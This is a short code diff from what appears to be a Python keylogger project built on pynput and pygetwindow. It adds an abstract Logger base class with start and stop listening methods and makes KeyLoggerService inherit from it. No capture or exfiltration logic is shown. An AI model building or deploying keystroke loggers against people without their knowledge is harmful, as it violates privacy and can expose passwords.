@@ -1,9 +1,18 @@
 from datetime import datetime
 import pygetwindow as gw
 from pynput.keyboard import Listener , Key , KeyCode
+from abc import ABC, abstractmethod
 
 
-class KeyLoggerService:
+class Logger(ABC):
+    @abstractmethod
+    def start_listening(self):
+        pass
+    @abstractmethod
+    def stop_listening(self):
+        pass
+
+class KeyLoggerService(Logger):
 
     def __init__(self):
         self.data = dict()
